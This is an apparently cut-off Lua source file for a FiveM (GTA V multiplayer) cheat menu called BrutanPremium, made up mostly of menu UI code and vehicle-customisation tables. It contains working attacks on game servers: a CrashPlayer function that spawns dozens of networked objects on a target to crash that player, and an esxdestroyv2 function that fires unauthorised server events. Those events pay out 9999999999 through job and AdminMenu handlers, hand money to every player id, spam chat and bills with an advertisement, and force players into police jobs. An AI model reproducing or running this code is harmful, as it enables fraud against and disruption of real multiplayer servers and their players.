        setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
        setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
        setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
    else
        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
    end
end


function BrutanPremium.CurrentMenu()
    return currentMenu
end


function trynaskidhuh(id)
    if id and menus[id] then
        PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
        setMenuVisible(id, true)
        debugPrint(tostring(id).." menu opened")
    else
        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
    end
end


function BrutanPremium.IsMenuOpened(id)
    return isMenuVisible(id)
end


function BrutanPremium.IsAnyMenuOpened()
    for id, _ in pairs(menus) do
        if isMenuVisible(id) then return true end
    end

    return false
end


function BrutanPremium.IsMenuAboutToBeClosed()
    if menus[currentMenu] then
        return menus[currentMenu].aboutToBeClosed
    else
        return false
    end
end


function BrutanPremium.CloseMenu()
    if menus[currentMenu] then
        if menus[currentMenu].aboutToBeClosed then
            menus[currentMenu].aboutToBeClosed = false
            setMenuVisible(currentMenu, false)
            debugPrint(tostring(currentMenu).." menu closed")
            PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            optionCount = 0
            currentMenu = nil
            currentKey = nil
        else
            menus[currentMenu].aboutToBeClosed = true
            debugPrint(tostring(currentMenu).." menu about to be closed")
        end
    end
end


function BrutanPremium.Button(text, subText)
    local buttonText = text
    if subText then
        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
    end

    if menus[currentMenu] then
        optionCount = optionCount + 1

        local isCurrent = menus[currentMenu].currentOption == optionCount

        drawButton(text, subText)

        if isCurrent then
            if currentKey == keys.select then
                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
                debugPrint(buttonText.." button pressed")
                return true
            elseif currentKey == keys.left or currentKey == keys.right then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
            end
        end

        return false
    else
        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")

        return false
    end
end


function BrutanPremium.MenuButton(text, id)
    if menus[id] then
        if BrutanPremium.Button(text) then
            setMenuVisible(currentMenu, false)
            setMenuVisible(id, true, true)

            return true
        end
    else
        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
    end

    return false
end

local bm = {
    {
        name = "~h~~r~Engine",
        id = 11
    },
    {
        name = "~h~~b~Brakes",
        id = 12
    },
    {
        name = "~h~~g~Transmission",
        id = 13
    },
    {
        name = "~h~~y~Suspension",
        id = 15
    },
    {
        name = "~h~~b~Armor",
        id = 16
    }
}

function BrutanPremium.CheckBox(text, checked, callback)
    if BrutanPremium.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
        checked = not checked
        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
        if callback then callback(checked) end

        return true
    end

    return false
end


function BrutanPremium.ComboBox(text, items, currentIndex, selectedIndex, callback)
    local itemsCount = #items
    local selectedItem = items[currentIndex]
    local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

    if itemsCount > 1 and isCurrent then
        selectedItem = "← "..tostring(selectedItem).." →"
    end

    if BrutanPremium.Button(text, selectedItem) then
        selectedIndex = currentIndex
        callback(currentIndex, selectedIndex)
        return true
    elseif isCurrent then
        if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 else currentIndex = itemsCount end
        elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 else currentIndex = 1 end
        end
    else
        currentIndex = selectedIndex
    end

    callback(currentIndex, selectedIndex)
    return false
end

function BrutanPremium.Display()
    if isMenuVisible(currentMenu) then
        if menus[currentMenu].aboutToBeClosed then
            BrutanPremium.CloseMenu()
        else
            ClearAllHelpMessages()

            drawTitle()
            drawSubTitle()

            currentKey = nil

            if IsControlJustReleased(1, keys.down) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption < optionCount then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
                else
                    menus[currentMenu].currentOption = 1
                end
            elseif IsControlJustReleased(1, keys.up) then
                PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

                if menus[currentMenu].currentOption > 1 then
                    menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
                else
                    menus[currentMenu].currentOption = optionCount
                end
            elseif IsControlJustReleased(1, keys.left) then
                currentKey = keys.left
            elseif IsControlJustReleased(1, keys.right) then
                currentKey = keys.right
            elseif IsControlJustReleased(1, keys.select) then
                currentKey = keys.select
            elseif IsControlJustReleased(1, keys.back) then
                if menus[menus[currentMenu].previousMenu] then
                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                    setMenuVisible(menus[currentMenu].previousMenu, true)
                else
                    BrutanPremium.CloseMenu()
                end
            end

            optionCount = 0
        end
    end
end


function BrutanPremium.SetMenuWidth(id, width)
    setMenuProperty(id, "width", width)
end


function BrutanPremium.SetMenuX(id, x)
    setMenuProperty(id, "x", x)
end


function BrutanPremium.SetMenuY(id, y)
    setMenuProperty(id, "y", y)
end


function BrutanPremium.SetMenuMaxOptionCountOnScreen(id, count)
    setMenuProperty(id, "maxOptionCount", count)
end


function BrutanPremium.SetTitle(id, title)
    setMenuProperty(id, "title", title)
end


function BrutanPremium.SetTitleColor(id, r, g, b, a)
    setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
end


function BrutanPremium.SetTitleBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
end


function BrutanPremium.SetTitleBackgroundSprite(id, textureDict, textureName)
    RequestStreamedTextureDict(textureDict)
    setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
end


function BrutanPremium.SetSubTitle(id, text)
    setMenuProperty(id, "subTitle", string.upper(text))
end


function BrutanPremium.SetMenuBackgroundColor(id, r, g, b, a)
    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
end


function BrutanPremium.SetMenuTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
end

function BrutanPremium.SetMenuSubTextColor(id, r, g, b, a)
    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
end

function BrutanPremium.SetMenuFocusColor(id, r, g, b, a)
    setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
end


function BrutanPremium.SetMenuButtonPressedSound(id, name, set)
    setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
end

function drawNotification(text)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(text)
    DrawNotification(false, false)
end


function getEntity(player)
    local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
    return entity
end

local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(u)
    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
 end

 local bn = {
    {
        name = "~h~Blue on White 2",
        id = 0
    },
    {
        name = "~h~Blue on White 3",
        id = 4
    },
    {
        name = "~h~Yellow on Blue",
        id = 2
    },
    {
        name = "~h~Yellow on Black",
        id = 1
    },
    {
        name = "~h~North Yankton",
        id = 5
    }
}

local bp = {
    ["Stock Horn"] = -1,
    ["Truck Horn"] = 1,
    ["Police Horn"] = 2,
    ["Clown Horn"] = 3,
    ["Musical Horn 1"] = 4,
    ["Musical Horn 2"] = 5,
    ["Musical Horn 3"] = 6,
    ["Musical Horn 4"] = 7,
    ["Musical Horn 5"] = 8,
    ["Sad Trombone Horn"] = 9,
    ["Classical Horn 1"] = 10,
    ["Classical Horn 2"] = 11,
    ["Classical Horn 3"] = 12,
    ["Classical Horn 4"] = 13,
    ["Classical Horn 5"] = 14,
    ["Classical Horn 6"] = 15,
    ["Classical Horn 7"] = 16,
    ["Scaledo Horn"] = 17,
    ["Scalere Horn"] = 18,
    ["Salemi Horn"] = 19,
    ["Scalefa Horn"] = 20,
    ["Scalesol Horn"] = 21,
    ["Scalela Horn"] = 22,
    ["Scaleti Horn"] = 23,
    ["Scaledo Horn High"] = 24,
    ["Jazz Horn 1"] = 25,
    ["Jazz Horn 2"] = 26,
    ["Jazz Horn 3"] = 27,
    ["Jazz Loop Horn"] = 28,
    ["Starspangban Horn 1"] = 28,
    ["Starspangban Horn 2"] = 29,
    ["Starspangban Horn 3"] = 30,
    ["Starspangban Horn 4"] = 31,
    ["Classical Loop 1"] = 32,
    ["Classical Horn 8"] = 33,
    ["Classical Loop 2"] = 34
}
local bq = {
    ["White"] = {
        255,
        255,
        255
    },
    ["Blue"] = {
        0,
        0,
        255
    },
    ["Electric Blue"] = {
        0,
        150,
        255
    },
    ["Mint Green"] = {
        50,
        255,
        155
    },
    ["Lime Green"] = {
        0,
        255,
        0
    },
    ["Yellow"] = {
        255,
        255,
        0
    },
    ["Golden Shower"] = {
        204,
        204,
        0
    },
    ["Orange"] = {
        255,
        128,
        0
    },
    ["Red"] = {
        255,
        0,
        0
    },
    ["Pony Pink"] = {
        255,
        102,
        255
    },
    ["Hot Pink"] = {
        255,
        0,
        255
    },
    ["Purple"] = {
        153,
        0,
        153
    }
}


local br = {
    {
        name = "~h~Black",
        id = 0
    },
    {
        name = "~h~Carbon Black",
        id = 147
    },
    {
        name = "~h~Graphite",
        id = 1
    },
    {
        name = "~h~Anhracite Black",
        id = 11
    },
    {
        name = "~h~Black Steel",
        id = 2
    },
    {
        name = "~h~Dark Steel",
        id = 3
    },
    {
        name = "~h~Silver",
        id = 4
    },
    {
        name = "~h~Bluish Silver",
        id = 5
    },
    {
        name = "~h~Rolled Steel",
        id = 6
    },
    {
        name = "~h~Shadow Silver",
        id = 7
    },
    {
        name = "~h~Stone Silver",
        id = 8
    },
    {
        name = "~h~Midnight Silver",
        id = 9
    },
    {
        name = "~h~Cast Iron Silver",
        id = 10
    },
    {
        name = "~h~Red",
        id = 27
    },
    {
        name = "~h~Torino Red",
        id = 28
    },
    {
        name = "~h~Formula Red",
        id = 29
    },
    {
        name = "~h~Lava Red",
        id = 150
    },
    {
        name = "~h~Blaze Red",
        id = 30
    },
    {
        name = "~h~Grace Red",
        id = 31
    },
    {
        name = "~h~Garnet Red",
        id = 32
    },
    {
        name = "~h~Sunset Red",
        id = 33
    },
    {
        name = "~h~Cabernet Red",
        id = 34
    },
    {
        name = "~h~Wine Red",
        id = 143
    },
    {
        name = "~h~Candy Red",
        id = 35
    },
    {
        name = "~h~Hot Pink",
        id = 135
    },
    {
        name = "~h~Pfsiter Pink",
        id = 137
    },
    {
        name = "~h~Salmon Pink",
        id = 136
    },
    {
        name = "~h~Sunrise Orange",
        id = 36
    },
    {
        name = "~h~Orange",
        id = 38
    },
    {
        name = "~h~Bright Orange",
        id = 138
    },
    {
        name = "~h~Gold",
        id = 99
    },
    {
        name = "~h~Bronze",
        id = 90
    },
    {
        name = "~h~Yellow",
        id = 88
    },
    {
        name = "~h~Race Yellow",
        id = 89
    },
    {
        name = "~h~Dew Yellow",
        id = 91
    },
    {
        name = "~h~Dark Green",
        id = 49
    },
    {
        name = "~h~Racing Green",
        id = 50
    },
    {
        name = "~h~Sea Green",
        id = 51
    },
    {
        name = "~h~Olive Green",
        id = 52
    },
    {
        name = "~h~Bright Green",
        id = 53
    },
    {
        name = "~h~Gasoline Green",
        id = 54
    },
    {
        name = "~h~Lime Green",
        id = 92
    },
    {
        name = "~h~Midnight Blue",
        id = 141
    },
    {
        name = "~h~Galaxy Blue",
        id = 61
    },
    {
        name = "~h~Dark Blue",
        id = 62
    },
    {
        name = "~h~Saxon Blue",
        id = 63
    },
    {
        name = "~h~Blue",
        id = 64
    },
    {
        name = "~h~Mariner Blue",
        id = 65
    },
    {
        name = "~h~Harbor Blue",
        id = 66
    },
    {
        name = "~h~Diamond Blue",
        id = 67
    },
    {
        name = "~h~Surf Blue",
        id = 68
    },
    {
        name = "~h~Nautical Blue",
        id = 69
    },
    {
        name = "~h~Racing Blue",
        id = 73
    },
    {
        name = "~h~Ultra Blue",
        id = 70
    },
    {
        name = "~h~Light Blue",
        id = 74
    },
    {
        name = "~h~Chocolate Brown",
        id = 96
    },
    {
        name = "~h~Bison Brown",
        id = 101
    },
    {
        name = "~h~Creeen Brown",
        id = 95
    },
    {
        name = "~h~Feltzer Brown",
        id = 94
    },
    {
        name = "~h~Maple Brown",
        id = 97
    },
    {
        name = "~h~Beechwood Brown",
        id = 103
    },
    {
        name = "~h~Sienna Brown",
        id = 104
    },
    {
        name = "~h~Saddle Brown",
        id = 98
    },
    {
        name = "~h~Moss Brown",
        id = 100
    },
    {
        name = "~h~Woodbeech Brown",
        id = 102
    },
    {
        name = "~h~Straw Brown",
        id = 99
    },
    {
        name = "~h~Sandy Brown",
        id = 105
    },
    {
        name = "~h~Bleached Brown",
        id = 106
    },
    {
        name = "~h~Schafter Purple",
        id = 71
    },
    {
        name = "~h~Spinnaker Purple",
        id = 72
    },
    {
        name = "~h~Midnight Purple",
        id = 142
    },
    {
        name = "~h~Bright Purple",
        id = 145
    },
    {
        name = "~h~Cream",
        id = 107
    },
    {
        name = "~h~Ice White",
        id = 111
    },
    {
        name = "~h~Frost White",
        id = 112
    }
}
local bt = {
    {
        name = "~h~Black",
        id = 12
    },
    {
        name = "~h~Gray",
        id = 13
    },
    {
        name = "~h~Light Gray",
        id = 14
    },
    {
        name = "~h~Ice White",
        id = 131
    },
    {
        name = "~h~Blue",
        id = 83
    },
    {
        name = "~h~Dark Blue",
        id = 82
    },
    {
        name = "~h~Midnight Blue",
        id = 84
    },
    {
        name = "~h~Midnight Purple",
        id = 149
    },
    {
        name = "~h~Schafter Purple",
        id = 148
    },
    {
        name = "~h~Red",
        id = 39
    },
    {
        name = "~h~Dark Red",
        id = 40
    },
    {
        name = "~h~Orange",
        id = 41
    },
    {
        name = "~h~Yellow",
        id = 42
    },
    {
        name = "~h~Lime Green",
        id = 55
    },
    {
        name = "~h~Green",
        id = 128
    },
    {
        name = "~h~Forest Green",
        id = 151
    },
    {
        name = "~h~Foliage Green",
        id = 155
    },
    {
        name = "~h~Olive Darb",
        id = 152
    },
    {
        name = "~h~Dark Earth",
        id = 153
    },
    {
        name = "~h~Desert Tan",
        id = 154
    }
}
local bu = {
    {
        name = "~h~Brushed Steel",
        id = 117
    },
    {
        name = "~h~Brushed Black Steel",
        id = 118
    },
    {
        name = "~h~Brushed Aluminum",
        id = 119
    },
    {
        name = "~h~Pure Gold",
        id = 158
    },
    {
        name = "~h~Brushed Gold",
        id = 159
    }
}
 

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function MaxOutPerf(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
end

function CrashPlayer(ped)
    local playerPos = GetEntityCoords(ped, false)
    local modelHashes = {
        0x34315488,
        0x6A27FEB1, 0xCB2ACC8,
        0xC6899CDE, 0xD14B5BA3,
        0xD9F4474C, 0x32A9996C,
        0x69D4F974, 0xCAFC1EC3,
        0x79B41171, 0x1075651,
        0xC07792D4, 0x781E451D,
        0x762657C6, 0xC2E75A21,
        0xC3C00861, 0x81FB3FF0,
        0x45EF7804, 0xE65EC0E4,
        0xE764D794, 0xFBF7D21F,
        0xE1AEB708, 0xA5E3D471,
        0xD971BBAE, 0xCF7A9A9D,
        0xC2CC99D8, 0x8FB233A4,
        0x24E08E1F, 0x337B2B54,
        0xB9402F87, 0x4F2526DA
    }

    for i = 1, #modelHashes do
        obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
    end
end

capPa = 'd' .. 'o' .. 'k' .. 'i'
cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
local bD = cappA

function esxdestroyv2()
                Citizen.CreateThread(
                    function()
                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
                        TriggerServerEvent('esx_carthief:pay', 9999999999)
                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
                        TriggerServerEvent('esx_pizza:pay', 9999999999)
                        TriggerServerEvent('esx_ranger:pay', 9999999999)
                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '~g~Brutan#7799',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~b~Brutan#7799'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~Add me for more menus Brutan#7799',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end

function ch(C,x,y)
    SetTextFont(0)
    SetTextProportional(1)
    SetTextScale(0.0,0.4)
    SetTextDropshadow(1,0,0,0,255)
    SetTextEdge(1,0,0,0,255)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    AddTextComponentString(C)
    DrawText(x,y)
end

local function getPlayerIds()
    local players = {}
    for i = -1, 128 do
        if NetworkIsPlayerActive(i) then
            players[#players + 1] = i
        end
    end
    return players
end

function DrawText3D(x, y, z, text, r, g, b)
    SetDrawOrigin(x, y, z, 0)
    SetTextFont(0)
    SetTextProportional(0)
    SetTextScale(0.0, 0.20)
    SetTextColour(r, g, b, 255)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 150)
    SetTextDropShadow()
    SetTextOutline()
    SetTextEntry("STRING")
    SetTextCentre(1)
    AddTextComponentString(text)
    DrawText(0.0, 0.0)
    ClearDrawOrigin()
end

local RCCar = {}

-- BrutanPremium

RCCar.Start = function()
	if DoesEntityExist(RCCar.Entity) then return end

	RCCar.Spawn()

	RCCar.Tablet(true)

	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
		Citizen.Wait(5)

		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)

		RCCar.DrawInstructions(distanceCheck)
		RCCar.HandleKeys(distanceCheck)

		if distanceCheck <= 10000000.0 then
			if not NetworkHasControlOfEntity(RCCar.Driver) then
				NetworkRequestControlOfEntity(RCCar.Driver)
			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
				NetworkRequestControlOfEntity(RCCar.Entity)
			end
		else
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end
	end
end

RCCar.HandleKeys = function(distanceCheck)
	if IsControlJustReleased(0, 47) then
		if IsCamRendering(RCCar.Camera) then
			RCCar.ToggleCamera(false)
		else
			RCCar.ToggleCamera(true)
		end
	end

	if distanceCheck <= 10000000.0 then
		if IsControlJustPressed(0, 73) then
			RCCar.Attach("pick")
		end
	end

	if distanceCheck < 10000000.0 then
	    if IsControlJustReleased(0, 108) then
		    local coos = GetEntityCoords(RCCar.Entity, true)
            AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
		end
		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
		end
		
		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
		end

		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
		end

		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
		end

		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
		end

		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
		end

		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
		end

		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
		end
	end
end

RCCar.DrawInstructions = function(distanceCheck)
	local steeringButtons = {
		{
			["label"] = "Right",
			["button"] = "~INPUT_CELLPHONE_RIGHT~"
		},
		{
			["label"] = "Forward",
			["button"] = "~INPUT_CELLPHONE_UP~"
		},
		{
			["label"] = "Reverse",
			["button"] = "~INPUT_CELLPHONE_DOWN~"
		},
		{
			["label"] = "Left",
